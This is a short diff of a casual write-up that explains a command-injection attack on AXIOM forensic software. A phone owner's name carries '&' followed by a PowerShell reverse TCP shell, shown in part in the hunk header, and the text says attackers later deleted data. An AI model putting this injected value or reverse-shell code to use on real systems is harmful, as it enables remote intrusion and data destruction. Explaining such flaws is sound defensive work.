@@ -38,6 +38,6 @@ mkdir C:\Evidence\MyPhone & powershell -nop -c "$c=New-Object Net.Sockets.TCPCli
 5.) $s.Write($x...): This takes the result of the command (like the list of files or the username) and "writes" it back across the network to the attacker's screen.
 
 
-Essentially becuase AXIOM software was "parsing" the owner's name and simply pasting it into a command string, it didn't realize that the & symbol would tell Windows to stop making the folder and start running this massive block of PowerShell code.
+Essentially becuase AXIOM software was parsing the owner's name and simply pasting it into a command string, it didn't realize that the & symbol would tell Windows to stop making the folder and start running this massive block of PowerShell code.
 Therefore opening a reverse TCP shell, then the attackers deleted 500TB of data and called it a day lol. 
 
